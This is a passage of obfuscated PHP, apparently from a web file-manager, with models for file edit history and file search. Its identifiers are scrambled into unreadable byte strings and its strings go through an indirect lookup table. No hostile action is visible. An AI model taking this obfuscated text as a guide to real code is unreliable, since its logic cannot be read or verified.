$©Æ›ØŸÖ[$˜Àïï[395]][$˜Àïï[396]] = 1; $©Æ›ØŸÖ[$˜Àïï[398]] = array(array($˜Àïï[446] => $Œ°ˆ¹¨Ÿ, $˜Àïï[2088] => $ò®İøŞÍ[$˜Àïï[461]], $˜Àïï[1667] => $ò®İøŞÍ[$˜Àïï[483]], $˜Àïï[451] => $˜Àïï[2108], $˜Àïï[452] => $ò®İøŞÍ[$˜Àïï[201]], $˜Àïï[1669] => $˜Àïï[12])); } return $this->eventListParse($©Æ›ØŸÖ, $Œ°ˆ¹¨Ÿ); } private function eventListParse($‰„­—§€, $ûä¹ôæî) { $¨ãû“ÃŞ =& $_SERVER[¹ş¤¶ĞÖ]; $€ÑÊëıó = $‰„­—§€[$¨ãû“ÃŞ[398]]; $²ÚåµÆ¯ = array_to_keyvalue($€ÑÊëıó, $¨ãû“ÃŞ[12], $¨ãû“ÃŞ[431]); $§âê„å = array_to_keyvalue($€ÑÊëıó, $¨ãû“ÃŞ[12], $¨ãû“ÃŞ[2094]); foreach ($€ÑÊëıó as $ôá®Ä‹ú) { $şÃü©¿Å = $ôá®Ä‹ú[$¨ãû“ÃŞ[482]]; if ($ôá®Ä‹ú[$¨ãû“ÃŞ[33]] == $¨ãû“ÃŞ[577] && isset($şÃü©¿Å[$¨ãû“ÃŞ[1193]])) { $²ÚåµÆ¯[] = $şÃü©¿Å[$¨ãû“ÃŞ[1193]] . $¨ãû“ÃŞ[12]; $²ÚåµÆ¯[] = $şÃü©¿Å[$¨ãû“ÃŞ[1194]] . $¨ãû“ÃŞ[12]; } if ($ôá®Ä‹ú[$¨ãû“ÃŞ[33]] == $¨ãû“ÃŞ[2104] && isset($şÃü©¿Å[$¨ãû“ÃŞ[431]])) { $²ÚåµÆ¯[] = $şÃü©¿Å[$¨ãû“ÃŞ[431]] . $¨ãû“ÃŞ[12]; } } $²ÚåµÆ¯ = array_merge($²ÚåµÆ¯, $§âê„å, array($ûä¹ôæî . $¨ãû“ÃŞ[12])); $²ÚåµÆ¯ = array_unique($²ÚåµÆ¯); $¨˜Ë‰µ¡ = array_unique(array_to_keyvalue($€ÑÊëıó, $¨ãû“ÃŞ[12], $¨ãû“ÃŞ[1676])); $´Ä‡¿‹“ = Model($¨ãû“ÃŞ[554])->userListInfo($¨˜Ë‰µ¡); $ßñĞÄõá = Model($¨ãû“ÃŞ[851])->sourceListInfo($²ÚåµÆ¯, !0); foreach ($€ÑÊëıó as &$ôá®Ä‹ú) { if ($ôá®Ä‹ú[$¨ãû“ÃŞ[33]] == $¨ãû“ÃŞ[577] && isset($ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[1193]])) { $ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[1193]] = $ßñĞÄõá[$ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[1193]]]; $ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[1194]] = $ßñĞÄõá[$ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[1194]]]; } if ($ôá®Ä‹ú[$¨ãû“ÃŞ[33]] == $¨ãû“ÃŞ[2104] && isset($ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[431]])) { $ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[431]] = $ßñĞÄõá[$ôá®Ä‹ú[$¨ãû“ÃŞ[482]][$¨ãû“ÃŞ[431]]]; } $ôá®Ä‹ú[$¨ãû“ÃŞ[87]] = $ßñĞÄõá[$ôá®Ä‹ú[$¨ãû“ÃŞ[431]]]; $ôá®Ä‹ú[$¨ãû“ÃŞ[2109]] = $ßñĞÄõá[$ôá®Ä‹ú[$¨ãû“ÃŞ[2094]]]; if ($ôá®Ä‹ú[$¨ãû“ÃŞ[33]] == $¨ãû“ÃŞ[1835]) { $ôá®Ä‹ú[$¨ãû“ÃŞ[2109]] = $ôá®Ä‹ú[$¨ãû“ÃŞ[87]]; $ôá®Ä‹ú[$¨ãû“ÃŞ[2094]] = $ôá®Ä‹ú[$¨ãû“ÃŞ[2109]][$¨ãû“ÃŞ[431]]; $ôá®Ä‹ú[$¨ãû“ÃŞ[87]] = !1; $ôá®Ä‹ú[$¨ãû“ÃŞ[431]] = $¨ãû“ÃŞ[12]; } $ôá®Ä‹ú[$¨ãû“ÃŞ[2038]] = $´Ä‡¿‹“[$ôá®Ä‹ú[$¨ãû“ÃŞ[1676]]]; } unset($ôá®Ä‹ú); $‰„­—§€[$¨ãû“ÃŞ[398]] = $€ÑÊëıó; return $‰„­—§€; } public function removeBySource($‘×¸‹˜ò) { $™´Ò’´í = array($_SERVER[¹ş¤¶ĞÖ][446] => $‘×¸‹˜ò); $this->where($™´Ò’´í)->remove(); } } goto eÕíÄ›„; A­ğ‘¥›’: define($_SERVER[¹ş¤¶ĞÖ][270], 1); define($_SERVER[¹ş¤¶ĞÖ][271], 0); define($_SERVER[¹ş¤¶ĞÖ][272], 2); goto C‰ÂÊˆâÊ; eÕíÄ›„: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\x63\x65\137\150\151\x73\x74\x6f\162\171"; public function historyCount($Áğãîè) { $àà şëå =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Áğãîè) { return array(); } if (is_string($Áğãîè) || is_int($Áğãîè)) { $Áğãîè = array($Áğãîè); } $Éã«‚é§ = array($àà şëå[431], $àà şëå[1899] => $àà şëå[520]); $Æ³õ…óñ = array($àà şëå[431] => array($àà şëå[7], $Áğãîè)); $É•¥Îğ = $this->field($Éã«‚é§)->where($Æ³õ…óñ)->group($àà şëå[431])->select(); return array_to_keyvalue($É•¥Îğ, $àà şëå[431], $àà şëå[520]); } public function addHistory($Ş¼Îè»‚, $õ——Œ²ö = '') { $˜‹Ú¿Äè =& $_SERVER[¹ş¤¶ĞÖ]; $ˆ•Ø•îó = array($˜‹Ú¿Äè[446] => $Ş¼Îè»‚[$˜‹Ú¿Äè[431]], $˜‹Ú¿Äè[1667] => isset($Ş¼Îè»‚[$˜‹Ú¿Äè[485]]) ? $Ş¼Îè»‚[$˜‹Ú¿Äè[485]] : $Ş¼Îè»‚[$˜‹Ú¿Äè[483]], $˜‹Ú¿Äè[498] => $Ş¼Îè»‚[$˜‹Ú¿Äè[497]], $˜‹Ú¿Äè[574] => $Ş¼Îè»‚[$˜‹Ú¿Äè[76]], $˜‹Ú¿Äè[2110] => $õ——Œ²ö); if ($GLOBALS[$˜‹Ú¿Äè[6]][$˜‹Ú¿Äè[89]][$˜‹Ú¿Äè[1250]] >= 1) { $this->historyAutoClear($ˆ•Ø•îó[$˜‹Ú¿Äè[431]]); $this->add($ˆ•Ø•îó); } Hook::trigger($˜‹Ú¿Äè[2111], $ˆ•Ø•îó); Model($˜‹Ú¿Äè[2112])->eventFileEdit($Ş¼Îè»‚[$˜‹Ú¿Äè[431]]); } private function historyAutoClear($¨Ã¸ó¹Ã) { $°¦¤¨­ =& $_SERVER[¹ş¤¶ĞÖ]; $¢²¥·Å = Model($°¦¤¨­[796])->get($°¦¤¨­[1272]); $•é°¿ç§ = $GLOBALS[$°¦¤¨­[6]][$°¦¤¨­[89]][$°¦¤¨­[1250]]; $ÜÔ‰»ë = $¢²¥·Å == $°¦¤¨­[1273] ? min(5, $•é°¿ç§) : $•é°¿ç§; $ÜÔ‰»ë = $ÜÔ‰»ë <= 0 ? 0 : $ÜÔ‰»ë - 1; if ($ÜÔ‰»ë >= 500) { return; } $È³†‡Ôí = array($°¦¤¨­[446] => $¨Ã¸ó¹Ã); $ÊËî¬¨ = $this->field($°¦¤¨­[2113])->where($È³†‡Ôí)->order($°¦¤¨­[2107])->select(); if (!$ÊËî¬¨ || $ÜÔ‰»ë >= count($ÊËî¬¨)) { return; } $†ÎÉä‡¨ = array_to_keyvalue($ÊËî¬¨, $°¦¤¨­[12], $°¦¤¨­[428]); $†ÎÉä‡¨ = array_slice($†ÎÉä‡¨, $ÜÔ‰»ë); $È­Ô§ü  = array_to_keyvalue($ÊËî¬¨, $°¦¤¨­[12], $°¦¤¨­[497]); $È­Ô§ü  = array_slice($È­Ô§ü , $ÜÔ‰»ë); if (!$†ÎÉä‡¨ || !$È­Ô§ü ) { return; } $È³†‡Ôí = array($°¦¤¨­[448] => array($°¦¤¨­[7], $†ÎÉä‡¨)); $this->where($È³†‡Ôí)->delete(); Model($°¦¤¨­[500])->remove($È­Ô§ü ); } public function listData($Ê‘¢µçæ) { $Á±è“Õé =& $_SERVER[¹ş¤¶ĞÖ]; $ÆÆìËáµ = array($Á±è“Õé[446] => $Ê‘¢µçæ); $ôº–øœ = $Á±è“Õé[2114]; $İäƒÒ› = $this->field($ôº–øœ)->where($ÆÆìËáµ)->order($Á±è“Õé[2107])->selectPage(); $this->_listAppendUser($İäƒÒ›[$Á±è“Õé[398]]); $“µ§«üÈ = Model($Á±è“Õé[796])->get($Á±è“Õé[1272]); $€“š£Ó = 5; if ($“µ§«üÈ == $Á±è“Õé[1273]) { $İäƒÒ›[$Á±è“Õé[398]] = array_slice($İäƒÒ›[$Á±è“Õé[398]], 0, $€“š£Ó); $İäƒÒ›[$Á±è“Õé[395]] = array($Á±è“Õé[2115] => 1, $Á±è“Õé[2116] => 20, $Á±è“Õé[2117] => 1, $Á±è“Õé[2118] => count($İäƒÒ›[$Á±è“Õé[398]])); } return $İäƒÒ›; } protected function _listAppendUser(&$‘·Çßñ ) { $Æã™ÀøÎ =& $_SERVER[¹ş¤¶ĞÖ]; $ÁãäüÂñ = array_to_keyvalue($‘·Çßñ , $Æã™ÀøÎ[12], $Æã™ÀøÎ[1676]); $°ìƒ¨ÍŒ = Model($Æã™ÀøÎ[554])->userListInfo($ÁãäüÂñ); foreach ($‘·Çßñ  as &$óÇ£ûÑƒ) { $ôæ‘²± = $óÇ£ûÑƒ[$Æã™ÀøÎ[1676]]; $óÇ£ûÑƒ[$Æã™ÀøÎ[483]] = $°ìƒ¨ÍŒ[$ôæ‘²±] ? $°ìƒ¨ÍŒ[$ôæ‘²±] : !1; } unset($óÇ£ûÑƒ); } public function fileInfo($ß»Îî¬¸) { $ÌŞ´´í´ =& $_SERVER[¹ş¤¶ĞÖ]; $Ì£šÃüº = $this->tablePrefix; $í¥š¹ññ = "{$Ì£šÃüº}\151\x6f\137\146\x69\154\x65\40\x66\151\154\x65\163\x20\x6f\156\x20\146\x69\154\x65\163\56\x66\x69\x6c\145\x49\104\40\75\x20\150\151\x73\164\x6f\162\x79\x2e\146\x69\x6c\145\111\104"; return $this->alias($ÌŞ´´í´[2119])->where(array($ÌŞ´´í´[448] => $ß»Îî¬¸))->join($í¥š¹ññ, $ÌŞ´´í´[2120])->find(); } public function removeItem($¿ ²¯·‚) { $ë£Áóìõ =& $_SERVER[¹ş¤¶ĞÖ]; $³Ç–àâ™ = array($ë£Áóìõ[448] => $¿ ²¯·‚); $ğˆ‰ÛÀı = $this->where($³Ç–àâ™)->find(); if ($ğˆ‰ÛÀı) { $ØÕÒÜŞÆ = $this->where($³Ç–àâ™)->delete(); Model($ë£Áóìõ[500])->remove($ğˆ‰ÛÀı[$ë£Áóìõ[497]]); return $ØÕÒÜŞÆ; } return !1; } public function removeBySource($”áÛã¦Ø) { $‰«è¨íË =& $_SERVER[¹ş¤¶ĞÖ]; if (!$”áÛã¦Ø) { return !1; } if (!is_array($”áÛã¦Ø)) { $”áÛã¦Ø = array($”áÛã¦Ø); } $¹»¾ÎâÖ = array($‰«è¨íË[446] => array($‰«è¨íË[7], $”áÛã¦Ø)); $Äí×Ğö = $this->field($‰«è¨íË[498])->where($¹»¾ÎâÖ)->select(); if ($Äí×Ğö) { $this->where($¹»¾ÎâÖ)->delete(); $©¬ğ = array_to_keyvalue($Äí×Ğö, $‰«è¨íË[12], $‰«è¨íË[497]); Model($‰«è¨íË[500])->remove($©¬ğ); } return !0; } public function setDetail($ºˆİÈ, $ö¡Õ‚ß²) { $Ò‡óÃöà =& $_SERVER[¹ş¤¶ĞÖ]; return $this->where(array($Ò‡óÃöà[448] => $ºˆİÈ))->save(array($Ò‡óÃöà[2110] => $ö¡Õ‚ß²)); } public function rollbackToItem($ÈÈ¹Ú»õ, $Šú®Ñ…ç) { $€ä…„ÍÈ =& $_SERVER[¹ş¤¶ĞÖ]; $ééó‡ú = Model($€ä…„ÍÈ[851])->sourceInfo($ÈÈ¹Ú»õ); $this->addHistory($ééó‡ú, LNG($€ä…„ÍÈ[2121])); $Û„Õ¼ˆş = $this->find($Šú®Ñ…ç); $ÆßªôŒÖ = array($€ä…„ÍÈ[497] => $Û„Õ¼ˆş[$€ä…„ÍÈ[497]], $€ä…„ÍÈ[76] => $Û„Õ¼ˆş[$€ä…„ÍÈ[76]], $€ä…„ÍÈ[85] => time(), $€ä…„ÍÈ[485] => USER_ID); Model($€ä…„ÍÈ[851])->where(array($€ä…„ÍÈ[431] => $ÈÈ¹Ú»õ))->save($ÆßªôŒÖ); return $this->where(array($€ä…„ÍÈ[448] => $Šú®Ñ…ç))->delete(); } public function clearSame($”Óç±ÆŠ) { $çÈïŠäê =& $_SERVER[¹ş¤¶ĞÖ]; $ÚìÈ¯¾ = $this->listData($”Óç±ÆŠ); $ÖŸ³Ï¸ë = array_to_keyvalue_group($ÚìÈ¯¾, $çÈïŠäê[497]); $Ã÷ŒÃùï = array(); $´¼ó‘‰ = array(); foreach ($ÖŸ³Ï¸ë as $íŞÜ•Ÿ) { if (!$íŞÜ•Ÿ || count($íŞÜ•Ÿ) <= 1) { continue; } foreach ($íŞÜ•Ÿ as $©˜ÓâŞú) { $Ã÷ŒÃùï[] = $©˜ÓâŞú[$çÈïŠäê[497]]; $´¼ó‘‰[] = $©˜ÓâŞú[$çÈïŠäê[428]]; } } if (!$´¼ó‘‰) { return; } $this->where(array($çÈïŠäê[428] => array($çÈïŠäê[7], $´¼ó‘‰)))->delete(); Model($çÈïŠäê[500])->remove($Ã÷ŒÃùï); } public function userSpace() { $„ÙŸªŒ =& $_SERVER[¹ş¤¶ĞÖ]; $Â†Ò½ ® = $this->tablePrefix; $Õ…ŸÂŞÔ = array($„ÙŸªŒ[1667] => USER_ID); $ÄãÇµæ = "{$Â†Ò½ ®}\151\157\x5f\x66\151\x6c\x65\40\146\151\154\145\x73\x20\157\156\40\x66\x69\154\x65\163\56\x66\x69\154\145\x49\104\x20\x3d\x20\x68\x69\163\x74\x6f\x72\171\56\146\151\x6c\x65\x49\x44"; return $this->alias($„ÙŸªŒ[2119])->where($Õ…ŸÂŞÔ)->join($ÄãÇµæ, $„ÙŸªŒ[2120])->sum($„ÙŸªŒ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($´©¹üª÷) { $«ºâ…¨“ =& $_SERVER[¹ş¤¶ĞÖ]; $€éÃ®¤ = KodIO::fileTypeList(); $¢îŠÅ³´ = $€éÃ®¤[$´©¹üª÷]; if (!$¢îŠÅ³´) { return array(); } $óÀğúí™ = $¢îŠÅ³´[$«ºâ…¨“[174]]; $ëá­ô¹‘ = $«ºâ…¨“[7]; if (!$¢îŠÅ³´[$«ºâ…¨“[174]]) { $ÔÅ‰ä‰² = array_to_keyvalue($€éÃ®¤, $«ºâ…¨“[12], $«ºâ…¨“[174]); $óÀğúí™ = implode($«ºâ…¨“[50], $ÔÅ‰ä‰²); $ëá­ô¹‘ = $«ºâ…¨“[2122]; } $Ô®Ş¢‘ø = explode($«ºâ…¨“[50], trim($óÀğúí™, $«ºâ…¨“[50])); return array($ëá­ô¹‘, $Ô®Ş¢‘ø); } public function listPathType($Ììİµ˜ü) { $°©ÀÕÈè =& $_SERVER[¹ş¤¶ĞÖ]; $š…âúŠó = $this->fileTypeWhere($Ììİµ˜ü); if (!$š…âúŠó) { return array(); } $éÉ´¶™§ = USER_ID; $õÌ¸Êù… = Model($°©ÀÕÈè[554])->getInfo($éÉ´¶™§); $»ª¡İ× = array($°©ÀÕÈè[605] => SourceModel::TYPE_USER, $°©ÀÕÈè[540] => array($°©ÀÕÈè[569], $°©ÀÕÈè[550] . $õÌ¸Êù…[$°©ÀÕÈè[87]][$°©ÀÕÈè[431]] . $°©ÀÕÈè[570]), $°©ÀÕÈè[606] => $éÉ´¶™§, $°©ÀÕÈè[603] => 0, $°©ÀÕÈè[604] => $š…âúŠó); return $this->listSource($»ª¡İ×); } public function listSearch($ÙåËÔ¨Ã, $Û¹¾™Ñ® = 300) { $×¨È¢È =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($ÙåËÔ¨Ã[$×¨È¢È[1960]]) && $ÙåËÔ¨Ã[$×¨È¢È[1960]]) { $ÙåËÔ¨Ã[$×¨È¢È[1960]] = str_replace($×¨È¢È[413], $×¨È¢È[2123], trim($ÙåËÔ¨Ã[$×¨È¢È[1960]])); } $£€Ùåë² = $this->_parseSearchWhere($ÙåËÔ¨Ã); if (!isset($£€Ùåë²[$×¨È¢È[460]])) { $£€Ùåë²[$×¨È¢È[460]] = 0; } $İÍŸ¢¶° = $×¨È¢È[2124]; $œıÔÛÓ§ = $£€Ùåë²; $½×ü¹§û = $İÍŸ¢¶°; $this->_listSearchBindPinyin($ÙåËÔ¨Ã, $£€Ùåë², $İÍŸ¢¶°); $this->alias($×¨È¢È[475])->_makeOrder(); $£€Ùåë² = $this->parseWhereLike($£€Ùåë²); $ÆÁå„‹ó = $this->distinct(!0)->field($İÍŸ¢¶°)->where($£€Ùåë²)->selectPage($Û¹¾™Ñ®); if ($GLOBALS[$×¨È¢È[6]][$×¨È¢È[410]][$×¨È¢È[411]] && Input::check($ÙåËÔ¨Ã[$×¨È¢È[1960]], $×¨È¢È[612]) && $ÆÁå„‹ó[$×¨È¢È[395]][$×¨È¢È[382]] == 1 && $ÆÁå„‹ó[$×¨È¢È[395]][$×¨È¢È[396]] == 0) { $ÆÁå„‹ó = $this->distinct(!0)->field($İÍŸ¢¶°)->where($œıÔÛÓ§)->limit(1000)->select(); $ÆÁå„‹ó = array_page_split($ÆÁå„‹ó, !1, $Û¹¾™Ñ®); } $this->_listSearchFileContent($ÆÁå„‹ó, $ÙåËÔ¨Ã, $½×ü¹§û, $œıÔÛÓ§); $this->_listSearchDesc($ÆÁå„‹ó, $ÙåËÔ¨Ã, $½×ü¹§û); $this->_listSearchTag($ÆÁå„‹ó, $ÙåËÔ¨Ã, $½×ü¹§û); $this->_listSearchGroupTag($ÆÁå„‹ó, $ÙåËÔ¨Ã, $½×ü¹§û); $this->_listDataApply($ÆÁå„‹ó[$×¨È¢È[398]]); $this->_listMake($ÆÁå„‹ó); return $ÆÁå„‹ó; } private function _listSearchFileContent(&$©·ƒÙÄì, $Øœ¸×ü³, $Üšƒûîö, $Ï÷÷õ÷ä) { $â¯ØÏ„ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Øœ¸×ü³[$â¯ØÏ„[1960]] || $©·ƒÙÄì[$â¯ØÏ„[395]][$â¯ØÏ„[382]] > 1) { return; } if (!isset($Ï÷÷õ÷ä[$â¯ØÏ„[32]]) || !is_array($Øœ¸×ü³[$â¯ØÏ„[497]])) { return; } $Ï÷÷õ÷ä[$â¯ØÏ„[497]] = array($â¯ØÏ„[7], $Øœ¸×ü³[$â¯ØÏ„[497]]); unset($Ï÷÷õ÷ä[$â¯ØÏ„[32]]); unset($Øœ¸×ü³[$â¯ØÏ„[497]]); $‰ğÆå†Ç = $this->field($Üšƒûîö)->where($Ï÷÷õ÷ä)->limit($â¯ØÏ„[2125])->select(); if (!$‰ğÆå†Ç || count($‰ğÆå†Ç) == 0) { return; } $©·ƒÙÄì[$â¯ØÏ„[398]] = array_merge($‰ğÆå†Ç, $©·ƒÙÄì[$â¯ØÏ„[398]]); $©·ƒÙÄì[$â¯ØÏ„[395]][$â¯ØÏ„[396]] += count($‰ğÆå†Ç); } private function _listSearchTag(&$“Âİ‹Õú, $…©ª¢—, $ìº§©Ãì) { $åŠãŒ¾â =& $_SERVER[¹ş¤¶ĞÖ]; if (!$…©ª¢—[$åŠãŒ¾â[1960]] || $“Âİ‹Õú[$åŠãŒ¾â[395]][$åŠãŒ¾â[382]] > 1) { return; } $ÊäºÜÏş = Model($åŠãŒ¾â[2126])->listData(); $¨Ë±ñ› = array(); $×¹õÈÓ = $…©ª¢—[$åŠãŒ¾â[1960]]; foreach ($ÊäºÜÏş as $È¬Ó•¨Û) { $ıìïò¬ = $È¬Ó•¨Û[$åŠãŒ¾â[32]]; $Í›àÙ¤Î = str_replace($åŠãŒ¾â[53], $åŠãŒ¾â[12], Pinyin::get($ıìïò¬)); if (stripos($ıìïò¬, $×¹õÈÓ) !== !1 || stripos($Í›àÙ¤Î, $×¹õÈÓ) !== !1) { $¨Ë±ñ›[] = $È¬Ó•¨Û[$åŠãŒ¾â[428]]; } } if (!$¨Ë±ñ›) { return; } $÷£…é¬ = array($åŠãŒ¾â[455] => array($åŠãŒ¾â[7], $¨Ë±ñ›), $åŠãŒ¾â[1676] => USER_ID); $ô·Ã‰Â‹ = Model($åŠãŒ¾â[457])->field($åŠãŒ¾â[84])->where($÷£…é¬)->select(); $ô·Ã‰Â‹ = array_to_keyvalue($ô·Ã‰Â‹, $åŠãŒ¾â[12], $åŠãŒ¾â[84]); $¶ÒÎÎíÕ = array_unique($ô·Ã‰Â‹); $this->_listSearchMerge($“Âİ‹Õú, $…©ª¢—, $ìº§©Ãì, $¶ÒÎÎíÕ); } private function _listSearchDesc(&$óÚüÎ×…, $öÍ˜¼æ, $Îæí¼Â¥) { $ÛØÖ†¬Ÿ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$öÍ˜¼æ[$ÛØÖ†¬Ÿ[1960]] || $óÚüÎ×…[$ÛØÖ†¬Ÿ[395]][$ÛØÖ†¬Ÿ[382]] > 1) { return; } $¯ÓÓ¼Ï = array($ÛØÖ†¬Ÿ[94] => $ÛØÖ†¬Ÿ[482], $ÛØÖ†¬Ÿ[403] => array($ÛØÖ†¬Ÿ[412], $ÛØÖ†¬Ÿ[1962] . $öÍ˜¼æ[$ÛØÖ†¬Ÿ[1960]] . $ÛØÖ†¬Ÿ[1962])); $¡à¹Î‹ì = !1; if ($¡à¹Î‹ì) { $Š»‘Å¬Á = $this->listSearchChildren($öÍ˜¼æ[$ÛØÖ†¬Ÿ[461]]); $Š»‘Å¬Á = array_unique($Š»‘Å¬Á); if (!$Š»‘Å¬Á) { return; } $¯ÓÓ¼Ï[$ÛØÖ†¬Ÿ[431]] = array($ÛØÖ†¬Ÿ[7], $Š»‘Å¬Á); } $¹¶Ô®ñè = Model($ÛØÖ†¬Ÿ[589])->field($ÛØÖ†¬Ÿ[431])->where($¯ÓÓ¼Ï)->limit(5000)->select(); $¶ÕÙ—Í = array_to_keyvalue($¹¶Ô®ñè, $ÛØÖ†¬Ÿ[12], $ÛØÖ†¬Ÿ[431]); $this->_listSearchMerge($óÚüÎ×…, $öÍ˜¼æ, $Îæí¼Â¥, $¶ÕÙ—Í); } private function _listSearchGroupTag(&$“Øî¤»™, $‚Ä•ŠÌë, $¥‡ìÜûÚ) { $Û¶ş•éª =& $_SERVER[¹ş¤¶ĞÖ]; if (!$‚Ä•ŠÌë[$Û¶ş•éª[1960]] || $“Øî¤»™[$Û¶ş•éª[395]][$Û¶ş•éª[382]] > 1 || !$‚Ä•ŠÌë[$Û¶ş•éª[461]]) { return; } $í¢‚çí¤ = $this->sourceInfo($‚Ä•ŠÌë[$Û¶ş•éª[461]]); if (!$í¢‚çí¤ || $í¢‚çí¤[$Û¶ş•éª[440]] != SourceModel::TYPE_GROUP) { return; } $êô¢†Ì÷ = $í¢‚çí¤[$Û¶ş•éª[525]]; $¢Ï±°Çì = Model($Û¶ş•éª[2127])->get($êô¢†Ì÷); $¸ÜŸŸÆ = array(); $É´í¯ÄĞ = $‚Ä•ŠÌë[$Û¶ş•éª[1960]]; foreach ($¢Ï±°Çì[$Û¶ş•éª[398]] as $ßÛÃóÖ) { $ßÓ´¿ö— = $ßÛÃóÖ[$Û¶ş•éª[32]]; $È„æòôÔ = str_replace($Û¶ş•éª[53], $Û¶ş•éª[12], Pinyin::get($ßÓ´¿ö—)); if (stripos($ßÓ´¿ö—, $É´í¯ÄĞ) !== !1 || stripos($È„æòôÔ, $É´í¯ÄĞ) !== !1) { $¸ÜŸŸÆ[] = $ßÛÃóÖ[$Û¶ş•éª[428]]; } } if (!$¸ÜŸŸÆ) { return; } $Ãí„ü¨– = array($Û¶ş•éª[455] => array($Û¶ş•éª[7], $¸ÜŸŸÆ), $Û¶ş•éª[1676] => 0, $Û¶ş•éª[33] => $Û¶ş•éª[1982] . $êô¢†Ì÷); $ñİ¡Â—æ = Model($Û¶ş•éª[457])->field($Û¶ş•éª[84])->where($Ãí„ü¨–)->select(); $ñİ¡Â—æ = array_to_keyvalue($ñİ¡Â—æ, $Û¶ş•éª[12], $Û¶ş•éª[84]); $Õ¥â½å = array_unique($ñİ¡Â—æ); $this->_listSearchMerge($“Øî¤»™, $‚Ä•ŠÌë, $¥‡ìÜûÚ, $Õ¥â½å); } private function _listSearchMerge(&$ãøğÄ©¹, $„¬Ã¯µÌ, $ïú¦åå¾, $ìÑùù) { $ö¹õœÎ• =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ìÑùù) { return; } $öüØ•›ö = array_to_keyvalue($ãøğÄ©¹[$ö¹õœÎ•[398]], $ö¹õœÎ•[12], $ö¹õœÎ•[431]); $¯ÀõÈ¬± = array_diff($ìÑùù, $öüØ•›ö); if (!$¯ÀõÈ¬±) { return; } $®çĞ÷Òƒ = array($ö¹õœÎ•[431] => array($ö¹õœÎ•[7], $¯ÀõÈ¬±)); $ÏíõÂ¹Ì = $this->field($ïú¦åå¾)->where($®çĞ÷Òƒ)->select(); if (!$ÏíõÂ¹Ì) { return; } $¾„ğ’ÁÙ = array(); foreach ($ÏíõÂ¹Ì as $Ó–İ†î) { if ($this->_listSearchFilter($Ó–İ†î, $„¬Ã¯µÌ)) { $¾„ğ’ÁÙ[] = $Ó–İ†î; } } $ãøğÄ©¹[$ö¹õœÎ•[398]] = array_merge($¾„ğ’ÁÙ, $ãøğÄ©¹[$ö¹õœÎ•[398]]); $ãøğÄ©¹[$ö¹õœÎ•[395]][$ö¹õœÎ•[396]] += count($¾„ğ’ÁÙ); } private function _listSearchFilter($Ò£Ã©†Æ, $Ì¢ëÎŸ) { $ÊÁ˜àâÛ =& $_SERVER[¹ş¤¶ĞÖ]; $ùšéŠ¦ = $Ò£Ã©†Æ[$ÊÁ˜àâÛ[439]] == $ÊÁ˜àâÛ[88]; if (!strstr($Ò£Ã©†Æ[$ÊÁ˜àâÛ[540]], $ÊÁ˜àâÛ[50] . $Ì¢ëÎŸ[$ÊÁ˜àâÛ[461]] . $ÊÁ˜àâÛ[50])) { return !1; } if (isset($Ì¢ëÎŸ[$ÊÁ˜àâÛ[441]]) && $Ì¢ëÎŸ[$ÊÁ˜àâÛ[441]] != $ÊÁ˜àâÛ[1921]) { if ($Ì¢ëÎŸ[$ÊÁ˜àâÛ[441]] == $ÊÁ˜àâÛ[75] && !$ùšéŠ¦) { return !1; } if ($Ì¢ëÎŸ[$ÊÁ˜àâÛ[441]] != $ÊÁ˜àâÛ[75] && $ùšéŠ¦) { return !1; } if (!strstr($Ò£Ã©†Æ[$ÊÁ˜àâÛ[174]], $ÊÁ˜àâÛ[50] . $Ì¢ëÎŸ[$ÊÁ˜àâÛ[441]] . $ÊÁ˜àâÛ[50])) { return !1; } } if (isset($Ì¢ëÎŸ[$ÊÁ˜àâÛ[2128]]) && $Ì¢ëÎŸ[$ÊÁ˜àâÛ[2128]] < $Ò£Ã©†Æ[$ÊÁ˜àâÛ[76]]) { return !1; } if (isset($Ì¢ëÎŸ[$ÊÁ˜àâÛ[2129]]) && $Ì¢ëÎŸ[$ÊÁ˜àâÛ[2129]] > $Ò£Ã©†Æ[$ÊÁ˜àâÛ[76]]) { return !1; } if (isset($Ì¢ëÎŸ[$ÊÁ˜àâÛ[619]]) && $Ì¢ëÎŸ[$ÊÁ˜àâÛ[619]] != $Ò£Ã©†Æ[$ÊÁ˜àâÛ[485]]) { return !1; } return !0; } public function listSearchChildren($ÕóµÈ½æ, $¬ßÅó“ = 5000) { $Û“™—Ô =& $_SERVER[¹ş¤¶ĞÖ]; $çşÆö´ = array(); $™‰âĞ = $this->sourceInfo($ÕóµÈ½æ); $á¯’·Ãñ = array($Û“™—Ô[540] => array($Û“™—Ô[412], $™‰âĞ[$Û“™—Ô[540]] . $™‰âĞ[$Û“™—Ô[431]] . $Û“™—Ô[570])); $±™®Ú´¶ = $this->field($Û“™—Ô[76])->where($á¯’·Ãñ)->limit($¬ßÅó“ + 1)->select(); $¶—¶å´¥ = is_array($±™®Ú´¶) ? count($±™®Ú´¶) : 0; if ($¶—¶å´¥ > $¬ßÅó“) { return $this->_listSearchChildrenNear($ÕóµÈ½æ, $¬ßÅó“); } $âæí³¨Ê = $this->field($Û“™—Ô[431])->where($á¯’·Ãñ)->select(); $çşÆö´ = array_to_keyvalue($âæí³¨Ê, $Û“™—Ô[12], $Û“™—Ô[431]); return $çşÆö´; } private function _listSearchChildrenNear($ÀŸìÅ¶ , $µœ›ı—µ) { $–·±ºëÀ =& $_SERVER[¹ş¤¶ĞÖ]; $¯•ş¹õö = array(); $ÈØ«æå¾ = array($–·±ºëÀ[461] => $ÀŸìÅ¶ ); $ğóâ£¬ = $this->field($–·±ºëÀ[2130])->where($ÈØ«æå¾)->select(); $ù‡ĞŞš² = array_to_keyvalue(array_filter_by_field($ğóâ£¬, $–·±ºëÀ[439], $–·±ºëÀ[88]), $–·±ºëÀ[12], 